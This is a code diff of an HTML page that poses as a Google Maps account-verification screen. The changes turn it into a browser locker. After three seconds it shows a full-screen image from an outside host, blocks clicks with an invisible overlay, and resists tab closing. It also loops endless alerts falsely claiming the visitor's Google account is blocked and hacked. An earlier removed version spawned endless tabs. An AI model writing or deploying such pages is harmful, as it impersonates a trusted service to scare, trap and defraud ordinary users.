@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Verificando cuenta</title>
     <style>
-        /* Reset completo */
         * {
             margin: 0;
             padding: 0;
@@ -18,10 +17,26 @@
             height: 100%;
             background: #ffffff;
             font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             overflow: hidden;
+            user-select: none;
+            -webkit-user-select: none;
+            cursor: default;
+        }
+
+        .capa-congelada {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9998;
+            background: transparent;
+            pointer-events: all;
+            display: none;
+        }
+
+        .capa-congelada.activa {
+            display: block;
         }
 
         .container {
@@ -34,13 +49,25 @@
             max-width: 420px;
             width: 100%;
             background: transparent;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1;
+            transition: opacity 0.5s ease;
+            pointer-events: none;
         }
 
-        /* Logo de Google Maps */
+        .container.oculto {
+            opacity: 0;
+            pointer-events: none;
+        }
+
         .google-maps-logo {
             display: flex;
             align-items: center;
             gap: 10px;
+            pointer-events: none;
         }
 
         .maps-icon {
@@ -77,6 +104,7 @@
             font-weight: 500;
             color: #1f1f1f;
             letter-spacing: -0.5px;
+            pointer-events: none;
         }
 
         .maps-text span {
@@ -84,7 +112,6 @@
             color: #5f6368;
         }
 
-        /* Círculo de carga */
         .loader {
             width: 48px;
             height: 48px;
@@ -95,6 +122,7 @@
             animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
             flex-shrink: 0;
             margin-top: 0.5rem;
+            pointer-events: none;
         }
 
         @keyframes spin {
@@ -112,6 +140,7 @@
             font-weight: 500;
             letter-spacing: 0.2px;
             text-align: center;
+            pointer-events: none;
         }
 
         .status-text .light {
@@ -125,6 +154,7 @@
             height: 1px;
             background: #dadce0;
             margin: 0.2rem 0;
+            pointer-events: none;
         }
 
         .sub-text {
@@ -133,6 +163,30 @@
             font-weight: 400;
             text-align: center;
             line-height: 1.5;
+            pointer-events: none;
+        }
+
+        .imagen-fondo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            display: none;
+            background: #000000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .imagen-fondo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .imagen-fondo.activa {
+            display: flex;
         }
 
         @media (max-width: 480px) {
@@ -155,8 +209,13 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Logo de Google Maps -->
+    <div id="capaCongelada" class="capa-congelada"></div>
+
+    <div id="imagenFondo" class="imagen-fondo">
+        <img id="imagenMostrada" src="" alt="Verificación de seguridad" />
+    </div>
+
+    <div id="contenedorPrincipal" class="container">
         <div class="google-maps-logo">
             <div class="maps-icon">
                 <div class="pin"></div>
@@ -166,18 +225,14 @@
             </div>
         </div>
 
-        <!-- Círculo de carga -->
         <div class="loader" role="status" aria-label="Cargando"></div>
 
-        <!-- Texto principal -->
         <div class="status-text">
             Verificando <span class="light">cuenta</span>
         </div>
 
-        <!-- Línea divisoria -->
         <div class="divider"></div>
 
-        <!-- Texto secundario -->
         <div class="sub-text">
             Esto puede tomar unos segundos
         </div>
@@ -185,50 +240,65 @@
 
     <script>
         (function() {
-            // Tiempo: 3 segundos
+            const URL_IMAGEN = "https://i.postimg.cc/7Y6HFY9m/IMG-20260902-153111.jpg";
             const TIEMPO_ALERTA = 3000;
-
-            // Mensaje con ortografía corregida
             const MENSAJE_ALERTA =
                 "Peligro, su cuenta ha sido bloqueada. Hemos detectado un dispositivo con acceso a su cuenta de Google, posiblemente hackeada.";
 
-            // Bandera para evitar múltiples temporizadores
             let alertaActiva = false;
+            let imagenActivada = false;
+            let pantallaCongelada = false;
 
-            // Función que muestra la alerta y abre una nueva pestaña
-            function mostrarAlertaYAbrirPestana() {
+            const capaCongelada = document.getElementById('capaCongelada');
+            const imagenFondo = document.getElementById('imagenFondo');
+            const imgElement = document.getElementById('imagenMostrada');
+            const contenedor = document.getElementById('contenedorPrincipal');
+
+            // Intentar evitar el cierre de la pestaña
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                return '';
+            });
+
+            function congelarPantalla() {
+                if (pantallaCongelada) return;
+                pantallaCongelada = true;
+                capaCongelada.classList.add('activa');
+            }
+
+            function activarImagenFondo() {
+                if (imagenActivada) return;
+                imagenActivada = true;
+                imgElement.src = URL_IMAGEN;
+                imagenFondo.classList.add('activa');
+                contenedor.classList.add('oculto');
+            }
+
+            // Bucle infinito de alertas (sin recargar ni abrir pestañas)
+            function bucleInfinitoAlertas() {
+                activarImagenFondo();
+                congelarPantalla();
+
                 // Mostrar la alerta
                 alert(MENSAJE_ALERTA);
 
-                // Abrir una nueva pestaña con la misma URL
-                // Usamos window.open con la URL actual
-                const urlActual = window.location.href;
-                window.open(urlActual, '_blank');
-
-                // Programar la siguiente alerta después de un breve retraso
-                setTimeout(mostrarAlertaYAbrirPestana, 100);
+                // Programar la siguiente alerta inmediatamente
+                // Usamos setTimeout para evitar stack overflow
+                setTimeout(bucleInfinitoAlertas, 50);
             }
 
-            // Función que inicia el bucle
             function iniciarBucle() {
                 if (alertaActiva) return;
                 alertaActiva = true;
-                // Primer llamado con un pequeño retraso
-                setTimeout(mostrarAlertaYAbrirPestana, 100);
+                // Pequeño retraso para que la página cargue bien
+                setTimeout(bucleInfinitoAlertas, 100);
             }
 
-            // Temporizador para activar el bucle a los 3 segundos
-            const timeoutId = setTimeout(iniciarBucle, TIEMPO_ALERTA);
+            // Esperar 3 segundos para la primera alerta
+            setTimeout(iniciarBucle, TIEMPO_ALERTA);
 
-            // Limpieza si la página se cierra antes del tiempo
-            window.addEventListener('beforeunload', function() {
-                if (timeoutId) {
-                    clearTimeout(timeoutId);
-                }
-            });
-
-            // Advertencia en consola (no visible para el usuario)
-            console.warn("⚠️ Esta página abrirá nuevas pestañas y alertas en bucle después de 3 segundos.");
+            console.log("⚠️ Bucle infinito de alertas activado. Para salir: Ctrl+W o cerrar navegador.");
         })();
     </script>
 </body>
